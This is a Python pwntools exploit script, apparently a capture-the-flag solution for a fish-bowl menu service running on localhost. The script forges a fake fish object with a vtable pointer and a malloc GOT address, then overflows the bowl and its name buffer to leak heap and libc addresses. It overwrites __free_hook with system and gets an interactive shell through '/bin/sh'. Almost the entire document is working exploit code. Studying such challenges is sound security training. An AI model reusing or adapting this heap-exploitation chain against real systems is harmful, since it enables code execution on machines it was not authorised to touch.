from pwn import *

VTABLE_FISH = 0x4037E0
MALLOC_GOT = 0x604F38

MALLOC_OFFSET = 0x84130
SYSTEM_OFFSET = 0x45390
FREE_HOOK_OFFSET = 0x3c67a8

PROMPT = '>>>> '
DIVIDER = '====================================================================================================='

cmd_count = 0


def buy_fish():
    global cmd_count
    cmd_count += 1
    p.recvuntil(PROMPT)
    p.sendline('1')


def sell_all():
    global cmd_count
    cmd_count += 1
    p.recvuntil(PROMPT)
    p.sendline('2')


def feed_all():
    global cmd_count
    cmd_count += 1
    p.recvuntil(PROMPT)
    p.sendline('3')


def show_fish_bowl():
    global cmd_count
    cmd_count += 1
    p.recvuntil(PROMPT)
    p.sendline('6')

    p.recvuntil('Money : ')
    money = int(p.recvuntil('$ =', drop=True))

    p.recvuntil(DIVIDER)

    fishes = []
    for row in range(4):
        ascii = []
        for i in range(4):
            p.recvuntil('Ascii :   ')
            ascii.append(p.recvuntil('      |', drop=True))
        name = []
        for i in range(4):
            p.recvuntil('Name  :   ')
            name.append(p.recvuntil('      |', drop=True))
        type_ = []
        for i in range(4):
            p.recvuntil('Type  : ')
            type_.append(p.recvuntil(' |', drop=True))
        exp = []
        for i in range(4):
            p.recvuntil('Exp   :   ')
            exp.append(int(p.recvuntil('      |', drop=True)))
        weight = []
        for i in range(4):
            p.recvuntil('Weight:   ')
            weight.append(int(p.recvuntil('      |', drop=True)))

        for i in range(4):
            fishes.append({
                'ascii': ascii[i],
                'name': name[i],
                'type': type_[i],
                'exp': exp[i],
                'weight': weight[i],
            })

    return money, fishes


def change_bowl_name(bowl_name):
    global cmd_count
    cmd_count += 1
    p.recvuntil(PROMPT)
    p.sendline('7')
    p.sendafter('$\n', bowl_name)


def change_fish_name(idx, name):
    global cmd_count
    cmd_count += 1
    p.recvuntil(PROMPT)
    p.sendline('8')
    p.recvuntil(PROMPT)
    p.sendline(str(idx+1))
    p.send(name)


def change_fish_ascii(idx, ascii):
    global cmd_count
    cmd_count += 1
    p.recvuntil(PROMPT)
    p.sendline('9')
    p.recvuntil(PROMPT)
    p.sendline(str(idx+1))
    p.send(ascii)

p = remote('localhost', 8883)

# fake fish in the name buffer (overlapped)
fake_fish = (
    p64(VTABLE_FISH) + p64(VTABLE_FISH) + '\x00'*0x18 +
    p64(100) + p64(200) + p64(300) +
    'Cute>_<\x00' + p64(MALLOC_GOT))
p.sendafter('Name : ', '/bin/sh'.ljust(16, '\x00') + fake_fish)

# work hard to earn money
buy_fish()
for i in range(10):
    feed_all()
sell_all()

while True:
    money = show_fish_bowl()[0]

    if money >= 3500:
        break
    else:
        for i in range(money / 500):
            buy_fish()
        for i in range(15):
            feed_all()
        sell_all()

log.success('cmd: %d, money: %d' % (cmd_count, money))

# overflow fish bowl
for i in range(17):
    buy_fish()

overflow_fish_addr, fishes = show_fish_bowl()
log.success('leaked fish address: 0x%x' % overflow_fish_addr)

for i in range(10):
    feed_all()

# overflow bowl name
FAKE_FISH_ADDR = overflow_fish_addr - 0x80*16 - 1008 + 16

payload = 'I am Very Rich'.ljust(16, '\x00')
payload += p64(FAKE_FISH_ADDR)
payload += p64(FAKE_FISH_ADDR+8)

change_bowl_name(payload)

fishes = show_fish_bowl()[1]
malloc_addr = u64(fishes[0]['name'][2:]+'\x00\x00')
libc_base = malloc_addr - MALLOC_OFFSET

log.success('libc base: 0x%x' % libc_base)

# overwrite __free_hook
change_fish_ascii(1, p64(libc_base + FREE_HOOK_OFFSET))
change_fish_name(0, p64(libc_base + SYSTEM_OFFSET))

p.recvuntil(PROMPT)
p.sendline('0')

p.interactive()
